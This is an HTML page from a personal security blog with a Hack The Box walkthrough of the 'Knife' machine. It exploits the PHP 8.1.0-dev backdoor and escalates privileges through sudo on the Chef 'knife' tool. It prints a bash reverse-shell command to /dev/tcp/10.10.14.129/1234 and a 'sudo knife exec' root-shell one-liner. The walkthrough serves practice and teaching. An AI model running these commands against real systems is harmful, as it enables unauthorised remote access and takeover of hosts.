<!DOCTYPE html>
<html lang="en"> 
<head>



<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-5YK5MXEZF1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-5YK5MXEZF1');
</script>


    <title>Write-ups</title>
    
    <!-- Meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
       
    <link rel="shortcut icon" href="favicon.ico"> 
    
    <!-- FontAwesome JS-->
    <script defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
    
    <!-- Theme CSS -->  
    <link id="theme-style" rel="stylesheet" href="assets/css/theme-1.css">
    

</head> 

<body>
    
    <header class="header text-center">	    
	    <h1 class="blog-name pt-lg-1 mb-0"><a href="index.html">Adventures with Bits  </a></h1>
        
	    <nav class="navbar navbar-expand-lg navbar-dark" >
           
			<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navigation" aria-controls="navigation" aria-expanded="false" aria-label="Toggle navigation">
			<span class="navbar-toggler-icon"></span>
			</button>

			<div id="navigation" class="collapse navbar-collapse flex-column" >
				<div class="profile-section pt-3 pt-lg-0">
				    <img class="profile-image mb-3 rounded mx-auto" src="assets/images/profile.png" alt="image" >			
					
					<div class="bio mb-3">"Technical Problems Can Have Artistic Solutions"<br>
                                 - Jon Erickson The Art of Exploitation </div><!--//bio-->
					<ul class="social-list list-inline py-3 mx-auto">

			            <li class="list-inline-item"><a href="https://twitter.com/HimashOnline"><i class="fab fa-twitter fa-fw"></i></a></li>
			           
			            <li class="list-inline-item"><a href="https://github.com/himash"><i class="fab fa-github-alt fa-fw"></i></a></li>
			            
			        </ul><!--//social-list-->
			        
				</div><!--//profile-section-->
				
				<ul class="navbar-nav flex-column text-left">
					<li class="nav-item">
					    <a class="nav-link" href="index.html"><i class="fas fa-home fa-fw mr-2"></i>Blog Home <span class="sr-only">(current)</span></a>
					</li>

          <li class="nav-item">
					    <a class="nav-link" href="exploits.html"><i class="fas fa-user fa-fw mr-2"></i>Exploits & Vulnerabilities</a>
					</li> 


					<li class="nav-item">
					    <a class="nav-link" href="publications.html"><i class="fas fa-bookmark fa-fw mr-2"></i>Publications</a>
					</li>

						<li class="nav-item">
					    <a class="nav-link" href="projects.html"><i class="fas fa-bookmark fa-fw mr-2"></i>Projects</a>
					</li>
					<li class="nav-item active">
					    <a class="nav-link" href="write-up.html"><i class="fas fa-user fa-fw mr-2"></i>Write-ups</a>
					</li>

					<li class="nav-item">
					    <a class="nav-link" href="tools.html"><i class="fas fa-user fa-fw mr-2"></i>Tools</a>
					</li>

				</ul>
				
				
			</div>
		</nav>
    </header>


    <!-----------------------------------Header and stuff Ends Here-------------------------------------------------->




<!-------------------------------------Article Starts Here --------------------------------------------------------------->


    <div class="main-wrapper">
	    
	    <article class="blog-post px-3 py-5 p-md-5">
		    <div class="container">
			    <header class="blog-post-header">
				    <h2 class="title mb-2">Knife - HTB</h2>
				    

			    </header>
			    
			    <div class="blog-post-body">

			    	<!-----PICTURE
				    <figure class="blog-banner">
				        <a href="https://made4dev.com"><img class="img-fluid" src="assets/images/blog/blog-post-banner.jpg" alt="image"></a>

				        
				        <figcaption class="mt-2 text-center image-caption">Image Credit: <a href="https://made4dev.com?ref=devblog" target="_blank">made4dev.com (Premium Programming T-shirts)</a></figcaption>
				    </figure>
				    -------------------------------------------------------->

				    <p>

				    	<br>

				    	<figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/writeup/knife/knife-intro.png" alt="image"></a>

				      </figure>

				      <br>

				      Knife is a easy machine with some new stuff to learn and exploit. let's start the machine with initial
				      scan.
				      

				      <br><br>



				      <figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/writeup/knife/kn-nmap1.png" alt="image"></a>

				      </figure>


				      <br> 

				      Initial nmap scan shows that port 22(SSH) and 80(HTTP) is opened, i just went to explore the application which
				      is in port 80. as you can see below, there is a website related to the health care. 

				      <br><br>

				    
				      <figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/writeup/knife/kn-web.png" alt="image"></a>

				      </figure>


				      <br> 



				      Exploring the application does not given any further hints or leads. not able to find any links or active functionalities such as account login. to move further i just checked the frameworks and technologies which has been used in the application. during the analysis i found the application is using PHP 8.1.0-dev. 


				      <br><br>

				    	<figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/writeup/knife/kn-php.png" alt="image"></a>

				      </figure>


				      <br>
 

              A simple exploit search revealed that mentioned PHP version is vulnerable to remote code execution due to a backdoor which is planted in that release. an attacker can execute arbitrary code by sending the User-Agentt header. this is very interesting, you can find the story of this vulnerability in this site: <br><a href='https://flast101.github.io/php-8.1.0-dev-backdoor-rce'> https://flast101.github.io/php-8.1.0-dev-backdoor-rce </a>


              <br><br>

				    	<figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/writeup/knife/kn-exploit.png" alt="image"></a>

				      </figure>


				      

				      By running the exploit <a href='https://www.exploit-db.com/exploits/49933'> https://www.exploit-db.com/exploits/49933 </a>
				      I'm able to get the shell of the machine after i got the user.txt

				      <br><br>


				      <figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/writeup/knife/kn-shell.png" alt="image"></a>

				      </figure>



				      <figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/writeup/knife/kn-user.png" alt="image"></a>

				      </figure>

				     

				       <h4 class="title mb-2">Privilege Escalation</h4>
                
               As you can see below image that 'knife' can be run as sudo.

		           <br>
		           <br>

		           <figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/writeup/knife/kn-sudo.png" alt="image"></a>

				      </figure>

				      Knife is a command-line tool that provides an interface between a local chef-repo and the Chef Infra Server. This is a very good documentation regarding knife : <a href='https://docs.chef.io/workstation/knife'> https://docs.chef.io/workstation/knife</a><br> To do privilege escalation, i would like to have a stable interactive shell therefore i just used this exploit to get reverse shell to my machine: <br> <a href=https://packetstormsecurity.com/files/162749/PHP-8.1.0-dev-Backdoor-Remote-Command-Injection.html> https://packetstormsecurity.com/files/162749/PHP-8.1.0-dev-Backdoor-Remote-Command-Injection.html</a><br>

				     
				      <br><br>


				      <figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/writeup/knife/kn-shell2.png" alt="image"></a>

				      </figure>

				      <br><br>

				      <pre>
				      	<code>
python3 exploit.py -u http://10.10.10.242/ -c "/bin/bash -c ' bash -i >& /dev/tcp/10.10.14.129/1234 0>&1'"

				      	</code>
				      </pre>


				       <figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/writeup/knife/kn-shell3.png" alt="image"></a>

				      </figure>

				      
				      Based on the knife documentation <a href='https://docs.chef.io/workstation/knife_exec/'> https://docs.chef.io/workstation/knife_exec </a> it is possible to run code via --exec sub command. by running the code i can get that root user and root.txt.

          <br><br>

          <pre>
          	<code>

sudo knife exec --exec "exec '/bin/sh -i'"

</code>
</pre>

<figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/writeup/knife/kn-root.png" alt="image"></a>

				      </figure>







 



	

<!--------------------------------------------Article End ------------------------------------------------------>



				    <!--------------------------------------------------------------------------------------------- Coding section
				    <h3 class="mt-5 mb-3">Code Block Example</h3>
				    <p>You can get more info at <a href="https://highlightjs.org/" target="_blank">https://highlightjs.org/</a>. Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commodo ligula eget dolor. Aenean massa. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Donec quam felis, ultricies nec, pellentesque eu, pretium quis, sem. Nulla consequat massa quis enim. Donec pede justo, fringilla vel, aliquet nec, vulputate eget, arcu. In enim justo, rhoncus ut, imperdiet a, venenatis vitae, justo. Nullam dictum felis eu pede mollis pretium. Integer tincidunt. Cras dapibus. Vivamus elementum semper nisi. Aenean vulputate eleifend tellus. Aenean leo ligula, porttitor eu, consequat vitae, eleifend ac, enim. </p>
				    <pre>
					    <code>
function $initHighlight(block, cls) {
  try {
    if (cls.search(/\bno\-highlight\b/) != -1)
      return process(block, true, 0x0F) +
             ` class="${cls}"`;
  } catch (e) {
    /* handle exception */
  }
  for (var i = 0 / 2; i < classes.length; i++) {
    if (checkCondition(classes[i]) === undefined)
      console.log('undefined');
  }
}

export  $initHighlight;
					    </code>
				    </pre>

				  Ending here --------------------------------------------------------------------------------------------> 

					

					
				   
			    </div>
				    

				  <!--------------------------------------------------------------------------------- Navigation section  
			    <nav class="blog-nav nav nav-justified my-5">
				  <a class="nav-link-prev nav-item nav-link rounded-left" href="index.html">Previous<i class="arrow-prev fas fa-long-arrow-alt-left"></i></a>
				  <a class="nav-link-next nav-item nav-link rounded-right" href="blog-list.html">Next<i class="arrow-next fas fa-long-arrow-alt-right"></i></a>
				</nav>
				-----------------------------------------------------------------------------------------------------------> 

	    </article>
	    

    
    </div><!--//main-wrapper-->
    



    
       
    <!-- Javascript -->          
    <script src="assets/plugins/jquery-3.3.1.min.js"></script>
    <script src="assets/plugins/popper.min.js"></script> 
    <script src="assets/plugins/bootstrap/js/bootstrap.min.js"></script> 
    
    <!-- Page Specific JS -->
    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.14.2/highlight.min.js"></script>

    <!-- Custom JS -->
    <script src="assets/js/blog.js"></script>
      
    

</body>
</html> 
